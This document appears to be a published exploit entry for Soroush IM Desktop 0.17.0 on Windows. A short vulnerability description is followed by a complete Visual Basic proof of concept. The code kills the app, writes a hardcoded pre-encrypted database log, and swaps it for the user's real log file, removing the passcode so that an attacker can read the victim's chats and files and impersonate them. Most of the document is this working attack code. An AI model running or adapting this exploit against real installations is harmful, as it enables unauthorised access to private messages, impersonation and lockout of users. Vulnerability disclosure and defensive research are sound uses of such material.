@@ -1,0 +1,122 @@
+# Exploit Title: Soroush IM Desktop App 0.17.0 - Authentication Bypass
+# Date: 2018-08-08 
+# Exploit Author: VortexNeoX64
+# Vendor Homepage: https://soroush-app.ir
+# Software Link: http://54.36.43.176/SoroushSetup0.17.0.exe
+# Version: 0.17.0 BETA
+# Tested on: Windows 10 1803 and windows server 2016 14393
+ 
+# Security Issue:
+# It seems that all databases are encrypted with a constant key and then producing same output 
+# across every other PCs so pushing NO_PASSCODE data ,that was encrypted before, to the databases
+# on any other PC, would process the database valid and remove the passcode. The database entriesd are first 
+# entered in a log file in the same folder of the database, and then the Soroush app pushes the log file 
+# into permanent database. Attacker can unlock the client app with database injection, and bypass the 
+# authentication process. This exploit leads to two important security risks:
+
+# 1.Attacker can access to all the data, chats, images, files and etc. then he/she is able to send and  receive data in behalf of the original user
+# 2.Attacker then may use the exploit to perform an DOS attack. which is done by setting a new passcode for the client without knowing the previews passcode 
+
+# PoC (.NET 4.0 Visual Basic)
+# PoC dose not support Windows XP, try change "\users\" to "\Documents and Settings\" 
+
+Module Module1
+
+    Sub Main()
+        Console.WriteLine("*** [Souroush IM Local Passcode bypass via database injection] ***")
+        Console.WriteLine("*** [Developed by [VortexNeoX64] 2018] ***")
+        Console.WriteLine("** [Tested on Windows 10 1803 and windows server 2016 14393 , Soroush version = 0.17.0 BETA] **")
+        Console.WriteLine("** [Affected systems: probebly Linux, MacOS and for sure  Windows] **")
+        Console.WriteLine("** [Vulnerability type: Local & Privilege Escalation [Passcode bypass] ]**")
+        Console.WriteLine()
+        Console.WriteLine("Press any Key to exploit...")
+        Console.ReadKey()
+        Dim _temp As Byte() = {237, 4, 235, 105, 158, 3, 1, 16, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0,
+                              1, 88, 97, 81, 122, 79, 114, 86, 89, 53, 79, 111, 73, 79, 77,
+                              90, 49, 52, 102, 83, 101, 122, 80, 113, 121, 122, 88, 49, 70,
+                              65, 108, 56, 52, 116, 112, 87, 75, 77, 117, 115, 122, 117, 109,
+                              72, 101, 116, 51, 43, 54, 122, 106, 55, 117, 108, 74, 66, 47, 99,
+                              107, 110, 87, 113, 107, 84, 111, 74, 66, 52, 118, 53, 74, 120, 75,
+                              47, 114, 122, 57, 122, 73, 53, 116, 43, 76, 122, 68, 116, 86, 81,
+                              61, 61, 182, 6, 123, 34, 100, 97, 116, 97, 34, 58, 34, 57, 105, 105,
+                              116, 76, 114, 118, 88, 76, 98, 99, 66, 67, 74, 52, 87, 102, 68, 55,
+                              106, 66, 82, 72, 109, 110, 113, 66, 57, 110, 82, 85, 90, 81, 54, 85,
+                              49, 113, 78, 120, 75, 55, 57, 98, 106, 85, 106, 109, 74, 102, 122,
+                              105, 67, 111, 65, 100, 114, 99, 98, 82, 119, 54, 43, 75, 68, 72, 47,
+                              108, 85, 82, 90, 77, 119, 73, 103, 70, 113, 57, 75, 57, 112, 115, 57,
+                              97, 49, 69, 47, 77, 104, 73, 51, 51, 114, 80, 83, 81, 113, 99, 117, 49,
+                              89, 87, 101, 49, 83, 75, 98, 103, 78, 84, 72, 113, 89, 82, 87, 71, 73,
+                              43, 88, 111, 85, 105, 69, 55, 72, 120, 121, 120, 57, 50, 90, 116, 116,
+                              43, 81, 75, 100, 103, 114, 67, 77, 120, 122, 65, 66, 66, 50, 117, 85,
+                              87, 68, 119, 67, 113, 68, 105, 53, 67, 111, 86, 69, 108, 77, 43, 113,
+                              90, 106, 118, 75, 100, 66, 99, 112, 120, 99, 47, 110, 80, 84, 67, 55,
+                              117, 111, 116, 86, 115, 89, 50, 89, 55, 88, 89, 49, 88, 52, 78, 69, 52,
+                              100, 105, 110, 71, 120, 67, 87, 118, 118, 73, 106, 107, 80, 51, 85, 114,
+                              75, 48, 51, 100, 67, 114, 71, 85, 75, 119, 98, 70, 48, 85, 101, 73, 50, 77,
+                              108, 97, 84, 67, 100, 49, 97, 77, 43, 119, 83, 80, 111, 99, 110, 105, 66,
+                              97, 67, 48, 52, 56, 82, 83, 110, 97, 120, 75, 56, 88, 55, 84, 89, 83, 111,
+                              65, 111, 115, 98, 117, 78, 80, 66, 110, 103, 72, 52, 110, 68, 97, 112, 74,
+                              84, 104, 108, 120, 104, 85, 78, 117, 70, 103, 57, 48, 98, 65, 87, 100, 83,
+                              111, 75, 105, 69, 65, 56, 69, 106, 105, 52, 120, 69, 111, 97, 49, 70, 109,
+                              73, 49, 69, 83, 110, 67, 66, 117, 114, 76, 111, 70, 75, 53, 73, 111, 81, 49,
+                              74, 115, 79, 105, 74, 108, 119, 51, 89, 116, 69, 70, 71, 121, 121, 102, 76,
+                              110, 85, 73, 121, 56, 49, 54, 85, 71, 80, 87, 69, 53, 79, 90, 53, 74, 72, 50,
+                              66, 117, 84, 47, 79, 90, 65, 77, 111, 57, 88, 115, 88, 68, 105, 77, 121, 108,
+                              111, 66, 105, 105, 75, 81, 49, 56, 117, 50, 85, 104, 78, 109, 97, 119, 79, 67,
+                              74, 78, 120, 53, 108, 51, 118, 48, 68, 104, 84, 51, 76, 75, 106, 69, 103, 55, 86,
+                              84, 115, 79, 80, 65, 121, 118, 54, 90, 90, 83, 118, 82, 51, 67, 118, 109, 66,
+                              86, 57, 108, 52, 114, 70, 120, 71, 50, 52, 108, 113, 66, 70, 70, 101, 115, 105,
+                              120, 88, 102, 74, 122, 108, 90, 69, 111, 68, 120, 80, 115, 70, 109, 116, 88, 67,
+                              65, 110, 65, 86, 106, 70, 74, 54, 49, 80, 67, 104, 104, 84, 120, 67, 116, 115, 82,
+                              73, 108, 78, 77, 109, 90, 122, 77, 90, 80, 73, 99, 80, 104, 115, 68, 83, 80, 80,
+                              72, 76, 98, 49, 56, 56, 67, 84, 80, 80, 47, 116, 85, 48, 72, 122, 116, 101, 83, 105,
+                              68, 47, 66, 97, 84, 107, 50, 104, 102, 121, 82, 66, 114, 72, 78, 75, 56, 118, 89, 101,
+                              122, 122, 82, 117, 85, 102, 43, 78, 111, 111, 79, 43, 90, 73, 51, 69, 71, 90, 52, 69, 57,
+                              48, 75, 101, 80, 82, 52, 48, 122, 76, 49, 118, 116, 68, 65, 78, 98, 80, 47, 109, 57,
+                              122, 53, 87, 83, 105, 113, 118, 110, 47, 111, 66, 69, 78, 51, 100, 67, 72, 106, 120, 80,
+                              81, 55, 119, 54, 78, 68, 120, 108, 86, 108, 83, 117, 119, 113, 120, 78, 87, 47, 86, 102,
+                              117, 65, 74, 77, 84, 84, 121, 103, 73, 80, 89, 87, 73, 117, 85, 111, 101, 54, 118, 106, 71,
+                              83, 69, 118, 101, 78, 80, 72, 121, 99, 99, 88, 122, 90, 76, 122, 71, 90, 102, 66, 85, 87, 81,
+                              101, 75, 74, 99, 86, 68, 80, 103, 109, 43, 88, 66, 80, 73, 56, 47, 101, 107, 111, 101, 71, 104,
+                              108, 97, 107, 70, 75, 85, 112, 112, 57, 75, 99, 102, 111, 111, 97, 75, 51, 56, 48, 121, 78, 115,
+                              87, 118, 52, 119, 88, 51, 65, 116, 51, 118, 111, 114, 74, 81, 101, 119, 117, 89, 97, 76, 78, 114,
+                              116, 52, 68, 121, 122, 90, 107, 52, 98, 117, 68, 110, 87, 119, 85, 48, 97, 122, 109, 104, 71, 111,
+                              69, 119, 88, 66, 78, 108, 81, 79, 89, 54, 49, 117, 66, 103, 78, 110, 78, 103, 82, 65, 61, 61,
+                              34, 44, 34, 116, 121, 112, 101, 34, 58, 34, 112, 114, 105, 109, 105, 116, 105, 118, 101, 34, 125}
+        Try
+            Console.WriteLine("Killing the app...")
+            Shell("Taskkill /im soroush.exe /f /t ", AppWinStyle.Hide, True)
+            Console.WriteLine("Making malicious database...")
+            Dim target As String = ""
+            Dim targetname As String = ""
+            Dim index As Integer = 0
+            Dim _info As IO.FileInfo()
+            Dim _Dirinfo As New IO.DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) & ":\Users\" & Environment.UserName & "\AppData\Roaming\Soroush\Data\73b880c1b168541ab6e01acc2f7bf46f06379320\")
+            IO.File.WriteAllBytes(Environment.CurrentDirectory & "\log.log", _temp)
+            Console.WriteLine("Getting orginal database name....")
+            _info = _Dirinfo.GetFiles()
+            For i = 0 To _info.Count - 1
+                If _info(i).Extension = ".log" Then
+                    target = _info(i).FullName
+                    targetname = _info(i).Name
+                    index = i
+                    Exit For
+                End If
+            Next
+            Console.WriteLine("Target file is : [" & target & "]")
+            Console.WriteLine("Renaming malicious database to [" & targetname & "]")
+            IO.File.Move(Environment.CurrentDirectory & "\log.log", Environment.CurrentDirectory & "\" & targetname)
+            Console.WriteLine("injecting database [" & target & "]")
+            Threading.Thread.Sleep(1500)
+            IO.File.Delete(target)
+            IO.File.Copy(Environment.CurrentDirectory & "\" & targetname, target)
+            Console.WriteLine("Done!")
+        Catch ex As Exception
+            Console.WriteLine(ex.Message)
+            Beep()
+        Finally
+            Console.ReadKey()
+        End Try
+    End Sub
+
+End Module
